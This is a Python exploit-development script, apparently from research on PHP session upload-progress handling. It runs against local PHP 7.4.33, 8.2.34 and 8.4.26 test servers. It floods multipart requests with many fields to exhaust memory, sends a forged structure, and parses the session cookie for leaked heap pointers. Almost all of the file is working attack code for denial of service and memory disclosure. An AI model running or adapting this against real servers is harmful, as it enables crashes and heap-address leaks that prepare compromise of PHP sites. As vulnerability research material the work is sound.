"""Try many small fields to exhaust memory on 7.4.33.
Each field is small (< 31MB limit), but the total exceeds memory_limit.
This is different from the multi-field test because we're using MORE fields
with SMALLER values to trigger the OOM through cumulative memory pressure.
"""
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

def test_many_fields(port, n_fields, field_kb, label):
    """Test many small fields to exhaust memory."""
    URL = f"http://127.0.0.1:{port}/"
    t = E.Target(URL, timeout=180.0, verbose=False)

    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
    ]
    for i in range(n_fields):
        parts.append({"name": f"big{i:04d}", "data": b"B" * int(field_kb * 1024)})
    total_mb = n_fields * field_kb / 1024
    print(f"  {label}: {n_fields} x {field_kb}KB = {total_mb:.0f}MB total", flush=True)

    try:
        r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
    except Exception as e:
        print(f"    REQUEST1 ERROR: {e}", flush=True)
        return False
    time.sleep(0.5)

    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    try:
        r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
    except Exception as e:
        print(f"    REQUEST2 ERROR: {e}", flush=True)
        return False
    raw = E.parse_cookie(r2)
    oom = len(raw) > 100
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    chunk = c.most_common(1)[0][0] if c else 0
    tag = " *** OOM/LEAK ***" if oom else "(no OOM)"
    chunk_str = f" chunk=0x{chunk:x}" if chunk else ""
    print(f"    cookie={len(raw)}B{tag}{chunk_str}", flush=True)
    return oom

print("=== Many small fields OOM test ===", flush=True)
print("\n--- 7.4.33 (port 18108) ---", flush=True)
test_many_fields(18108, 100, 1536, "7.4.33")  # 100 x 1.5MB = 150MB
time.sleep(1)
test_many_fields(18108, 200, 768, "7.4.33")   # 200 x 750KB = 150MB
time.sleep(1)
test_many_fields(18108, 50, 3072, "7.4.33")   # 50 x 3MB = 150MB
time.sleep(1)

print("\n--- 8.2.34 (port 18111) ---", flush=True)
test_many_fields(18111, 100, 1536, "8.2.34")
time.sleep(1)

print("\n--- 8.4.26 control (port 18113) ---", flush=True)
test_many_fields(18113, 100, 1536, "8.4.26")
time.sleep(1)

print("\n=== done ===", flush=True)
